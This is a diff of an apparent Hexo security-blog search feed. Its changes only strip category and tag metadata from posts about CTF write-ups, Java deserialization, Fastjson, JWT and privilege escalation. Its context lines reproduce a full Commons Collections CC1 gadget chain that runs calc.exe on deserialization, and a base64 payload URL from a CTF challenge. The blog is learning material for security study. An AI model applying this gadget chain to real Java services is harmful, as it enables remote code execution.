@@ -95,9 +95,6 @@
 
 
 ]]></content>
-      <categories>
-        <category>CTFWP</category>
-      </categories>
   </entry>
   <entry>
     <title>CC3和CC4</title>
@@ -346,9 +343,6 @@
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lazmap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Target.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler);</span><br><span class="line">        annotationInvocationHandler = (InvocationHandler) construct.newInstance(Target.class, proxyMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(annotationInvocationHandler);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
-      <tags>
-        <tag>JAVA</tag>
-      </tags>
   </entry>
   <entry>
     <title>CC2</title>
@@ -475,9 +469,6 @@
 
 <p>参考[(143条消息) <a href="https://blog.csdn.net/weixin_54902210/article/details/125078125">Java反序列化]—CommonsCollections5_Sentiment.的博客-CSDN博客</a></p>
 ]]></content>
-      <tags>
-        <tag>java</tag>
-      </tags>
   </entry>
   <entry>
     <title>CC6</title>
@@ -547,9 +538,6 @@
 
 
 ]]></content>
-      <tags>
-        <tag>java</tag>
-      </tags>
   </entry>
   <entry>
     <title>Fastjson漏洞总结</title>
@@ -695,9 +683,6 @@
 <p>太菜了还是就写一题<img src="/2023/04/02/HZNUCTF-web-2023/image-20230402121324673.png" class="" title="image-20230402121324673"></p>
 <p>后俩题以后补充</p>
 ]]></content>
-      <categories>
-        <category>CTFWP</category>
-      </categories>
   </entry>
   <entry>
     <title>Gemini-Pentest-v1</title>
@@ -855,9 +840,6 @@
 
 
 ]]></content>
-      <tags>
-        <tag>-靶机渗透</tag>
-      </tags>
   </entry>
   <entry>
     <title>JWT</title>
@@ -990,9 +972,6 @@
 <p>&#x2F;change?name&#x3D;bmV3X3Jvb2tpZQ&#x3D;&#x3D;&amp;newname&#x3D;bmV3X3Jvb2tpZQpzVmlkCkkwCnNiLg&#x3D;&#x3D;</p>
 <p>&#x2F;dacaiji?name&#x3D;new_rookie</p>
 ]]></content>
-      <tags>
-        <tag>JWT</tag>
-      </tags>
   </entry>
   <entry>
     <title>NKCTF2023-web</title>
@@ -1057,13 +1036,6 @@
 
 <img src="/2023/03/27/NKCTF2023-web/image-20230327131542876.png" class="" title="image-20230327131542876">
 ]]></content>
-      <categories>
-        <category>CTFWP</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>wp</tag>
-      </tags>
   </entry>
   <entry>
     <title>hexo+github搭建博客</title>
@@ -1195,12 +1167,6 @@
 
 
 ]]></content>
-      <categories>
-        <category>Others</category>
-      </categories>
-      <tags>
-        <tag>建站</tag>
-      </tags>
   </entry>
   <entry>
     <title>java代理模式</title>
@@ -1283,9 +1249,6 @@
 <hr>
 <p>原文链接：<a href="https://javaguide.cn/java/basis/proxy.html">https://javaguide.cn/java/basis/proxy.html</a></p>
 ]]></content>
-      <tags>
-        <tag>java</tag>
-      </tags>
   </entry>
   <entry>
     <title>linux提权总结</title>
@@ -1493,9 +1456,6 @@
 <p><a href="https://www.freebuf.com/articles/web/327710.html">Java安全学习—URLDNS链 - FreeBuf网络安全行业门户</a></p>
 <p><a href="https://songly.blog.csdn.net/article/details/118555444?spm=1001.2014.3001.5502">(119条消息) 2-java安全基础——动态类加载（反射）_反射动态加载类_songly_的博客-CSDN博客</a></p>
 ]]></content>
-      <tags>
-        <tag>java</tag>
-      </tags>
   </entry>
   <entry>
     <title>mysql总结</title>
@@ -1644,10 +1604,6 @@
 
 
 ]]></content>
-      <tags>
-        <tag>mysql</tag>
-        <tag>php</tag>
-      </tags>
   </entry>
   <entry>
     <title>php反序列化</title>
@@ -1889,9 +1845,6 @@
 <p><a href="https://www.freebuf.com/articles/web/263710.html">https://www.freebuf.com/articles/web/263710.html</a></p>
 <p><a href="https://blog.csdn.net/xxy605/article/details/120101090">https://blog.csdn.net/xxy605/article/details/120101090</a></p>
 ]]></content>
-      <tags>
-        <tag>PHP反序列化</tag>
-      </tags>
   </entry>
   <entry>
     <title>re匹配规则</title>
@@ -2060,9 +2013,6 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span>(x [,base ]) 将x转换为一个整数 可以<span class="number">16</span>进制转<span class="number">10</span>进制  <span class="built_in">int</span>(x,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">long(x [,base ]) 将x转换为一个长整数</span><br><span class="line"></span><br><span class="line"><span class="built_in">float</span>(x ) 将x转换到一个浮点数</span><br><span class="line"></span><br><span class="line"><span class="built_in">complex</span>(real [,imag ]) 创建一个复数</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>(x ) 将对象 x 转换为字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">repr</span>(x ) 将对象 x 转换为表达式字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">str</span> ) 用来计算在字符串中的有效Python表达式,并返回一个对象</span><br><span class="line"></span><br><span class="line"><span class="built_in">tuple</span>(s ) 将序列 s 转换为一个元组</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>(s ) 将序列 s 转换为一个列表</span><br><span class="line"></span><br><span class="line"><span class="built_in">chr</span>(x ) 将一个整数转换为一个字符</span><br><span class="line"></span><br><span class="line">unichr(x ) 将一个整数转换为Unicode字符</span><br><span class="line"></span><br><span class="line"><span class="built_in">ord</span>(x ) 将一个字符转换为它的整数值</span><br><span class="line"></span><br><span class="line"><span class="built_in">hex</span>(x ) 将一个整数转换为一个十六进制字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">oct</span>(x ) 将一个整数转换为一个八进制字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span>() 将一个整数转换二进制字符串</span><br></pre></td></tr></table></figure>
 
 ]]></content>
-      <tags>
-        <tag>python</tag>
-      </tags>
   </entry>
   <entry>
     <title>thinkphp多语言RCE</title>
@@ -2221,9 +2171,6 @@
 
 
 ]]></content>
-      <tags>
-        <tag>thinkphp</tag>
-      </tags>
   </entry>
   <entry>
     <title>网络代理详解</title>
@@ -2489,9 +2436,6 @@
 
 
 ]]></content>
-      <tags>
-        <tag>-后渗透</tag>
-      </tags>
   </entry>
   <entry>
     <title>ATTCK1</title>
